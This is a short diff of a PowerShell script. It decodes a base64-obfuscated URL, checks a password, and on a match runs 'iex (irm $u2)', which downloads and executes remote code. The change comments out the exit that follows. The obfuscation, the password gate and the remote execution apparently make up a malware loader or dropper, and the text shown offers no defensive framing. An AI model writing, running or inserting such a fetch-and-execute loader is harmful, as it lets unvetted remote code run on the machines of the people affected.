@@ -17,7 +17,7 @@ $u2 = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u1))
 # pw checkers
 if ($a3 -eq $p2) {
     iex (irm $u2)
-    exit
+    #exit
 } else {
     Write-Host "NO YOU ARE NOT ZAL"
     exit
